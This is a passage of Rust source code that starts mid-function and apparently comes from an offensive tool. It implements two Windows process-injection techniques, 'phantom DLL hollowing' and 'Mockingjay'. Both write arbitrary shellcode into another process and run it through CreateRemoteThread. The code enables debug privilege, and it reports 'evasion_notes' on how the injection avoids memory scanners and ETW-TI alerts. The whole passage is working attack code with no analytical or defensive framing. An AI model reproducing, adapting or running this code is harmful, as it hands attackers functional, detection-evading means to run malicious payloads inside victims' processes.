                "No .text section found in donor DLL".to_string(),
            ));
        }

        if shellcode_bytes.len() > text_size as usize {
            return Err(MemoricError::InjectionFailed(format!(
                "Shellcode ({} bytes) exceeds .text section ({} bytes)",
                shellcode_bytes.len(),
                text_size
            )));
        }

        let text_addr = remote_base as usize + text_rva as usize;

        // Change .text to writable, overwrite with shellcode, restore
        let mut old_protect = windows::Win32::System::Memory::PAGE_PROTECTION_FLAGS(0);
        VirtualProtectEx(
            *hprocess,
            text_addr as *mut _,
            shellcode_bytes.len(),
            PAGE_READWRITE,
            &mut old_protect,
        )
        .map_err(|e| MemoricError::InjectionFailed(format!("VirtualProtectEx RW: {}", e)))?;

        WriteProcessMemory(
            *hprocess,
            text_addr as *mut _,
            shellcode_bytes.as_ptr() as *const _,
            shellcode_bytes.len(),
            None,
        )
        .map_err(|e| MemoricError::InjectionFailed(format!("WriteProcessMemory .text: {}", e)))?;

        VirtualProtectEx(
            *hprocess,
            text_addr as *mut _,
            shellcode_bytes.len(),
            PAGE_EXECUTE_READ,
            &mut old_protect,
        )
        .map_err(|e| MemoricError::InjectionFailed(format!("VirtualProtectEx RX: {}", e)))?;

        // Execute from .text start
        let thread = CreateRemoteThread(
            *hprocess,
            None,
            0,
            Some(std::mem::transmute(text_addr)),
            None,
            0,
            None,
        )
        .map_err(|e| MemoricError::InjectionFailed(format!("CreateRemoteThread: {}", e)))?;

        Ok(serde_json::json!({
            "success": true,
            "technique": "phantom_dll_hollowing",
            "pid": pid,
            "donor_dll": donor_dll,
            "mapped_base": format!("0x{:016X}", remote_base as u64),
            "text_section": format!("0x{:016X}", text_addr as u64),
            "text_size": text_size,
            "shellcode_size": shellcode_bytes.len(),
            "thread_handle": thread.0 as u64,
            "evasion_notes": [
                "DLL mapped as SEC_IMAGE — appears as legitimate loaded module",
                "Shellcode lives in donor's .text section",
                "Memory scanners see known DLL backing"
            ],
            "message": format!("Phantom hollow: shellcode in {}'s .text at 0x{:016X}", donor_dll, text_addr)
        }))
    }
}

/// Mockingjay — find existing RWX sections in loaded DLLs, write shellcode directly
/// Zero allocation, zero protection change — ultimate stealth
pub fn mockingjay_inject(args: &Value) -> Result<Value, MemoricError> {
    use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
    use windows::Win32::System::Memory::{
        VirtualQueryEx, MEMORY_BASIC_INFORMATION, PAGE_EXECUTE_READWRITE,
    };
    use windows::Win32::System::Threading::{
        CreateRemoteThread, OpenProcess, PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION,
        PROCESS_VM_OPERATION, PROCESS_VM_READ, PROCESS_VM_WRITE,
    };

    let pid = args
        .get("pid")
        .and_then(|v| v.as_u64())
        .ok_or_else(|| MemoricError::InjectionFailed("Missing pid".to_string()))?;
    let shellcode = args
        .get("shellcode")
        .and_then(|v| v.as_array())
        .ok_or_else(|| MemoricError::InjectionFailed("Missing shellcode".to_string()))?;
    let scan_start = args
        .get("scan_start")
        .and_then(|v| v.as_u64())
        .unwrap_or(0x10000);
    let scan_end = args
        .get("scan_end")
        .and_then(|v| v.as_u64())
        .unwrap_or(0x7FFFFFFFFFFF);

    let shellcode_bytes: Vec<u8> = shellcode
        .iter()
        .filter_map(|v| v.as_u64().map(|b| b as u8))
        .collect();
    if shellcode_bytes.is_empty() {
        return Err(MemoricError::InjectionFailed("Empty shellcode".to_string()));
    }

    tracing::warn!(
        "[INJECT] Mockingjay: PID {} scanning for RWX ({} bytes)",
        pid,
        shellcode_bytes.len()
    );

    let _ = crate::privilege::debug::enable_debug_privilege(&serde_json::json!({}));

    unsafe {
        let hprocess = OpenProcess(
            PROCESS_VM_WRITE
                | PROCESS_VM_OPERATION
                | PROCESS_VM_READ
                | PROCESS_QUERY_INFORMATION
                | PROCESS_CREATE_THREAD,
            false,
            pid as u32,
        )
        .map_err(|e| MemoricError::WindowsApi(format!("OpenProcess: {}", e)))?;
        let hprocess = SafeHandle::new(hprocess);

        // Scan for existing RWX regions
        let mut addr = scan_start as usize;
        let mut rwx_regions: Vec<(usize, usize)> = Vec::new();
        let mut chosen_addr: usize = 0;

        while addr < scan_end as usize {
            let mut mbi: MEMORY_BASIC_INFORMATION = std::mem::zeroed();
            let result = VirtualQueryEx(
                *hprocess,
                Some(addr as *const _),
                &mut mbi,
                std::mem::size_of::<MEMORY_BASIC_INFORMATION>(),
            );
            if result == 0 {
                break;
            }

            if mbi.Protect == PAGE_EXECUTE_READWRITE && mbi.RegionSize >= shellcode_bytes.len() {
                rwx_regions.push((mbi.BaseAddress as usize, mbi.RegionSize));
                if chosen_addr == 0 {
                    chosen_addr = mbi.BaseAddress as usize;
                }
            }

            addr = mbi.BaseAddress as usize + mbi.RegionSize;
            if addr <= mbi.BaseAddress as usize {
                break;
            } // overflow guard
        }

        if chosen_addr == 0 {
            return Ok(serde_json::json!({
                "success": false,
                "technique": "mockingjay",
                "pid": pid,
                "rwx_regions_found": 0,
                "message": "No suitable RWX regions found in target process. Try a process that loads msys-2.0.dll, Visual Studio DLLs, or other DLLs with RWX sections."
            }));
        }

        // Write shellcode directly — no alloc, no protect change
        WriteProcessMemory(
            *hprocess,
            chosen_addr as *mut _,
            shellcode_bytes.as_ptr() as *const _,
            shellcode_bytes.len(),
            None,
        )
        .map_err(|e| MemoricError::InjectionFailed(format!("WriteProcessMemory RWX: {}", e)))?;

        let thread = CreateRemoteThread(
            *hprocess,
            None,
            0,
            Some(std::mem::transmute(chosen_addr)),
            None,
            0,
            None,
        )
        .map_err(|e| MemoricError::InjectionFailed(format!("CreateRemoteThread: {}", e)))?;

        Ok(serde_json::json!({
            "success": true,
            "technique": "mockingjay",
            "pid": pid,
            "shellcode_address": format!("0x{:016X}", chosen_addr as u64),
            "rwx_regions_found": rwx_regions.len(),
            "all_rwx_regions": rwx_regions.iter().map(|(base, size)| {
                serde_json::json!({
                    "base": format!("0x{:016X}", *base as u64),
                    "size": size
                })
            }).collect::<Vec<_>>(),
            "thread_handle": thread.0 as u64,
            "evasion_notes": [
                "ZERO VirtualAllocEx calls",
                "ZERO VirtualProtectEx calls",
                "Shellcode written to existing RWX section",
                "ETW-TI has no allocation/protection events to flag"
            ],
            "message": format!("Mockingjay: shellcode at 0x{:016X} in existing RWX region — zero new allocations", chosen_addr)
        }))
    }
}
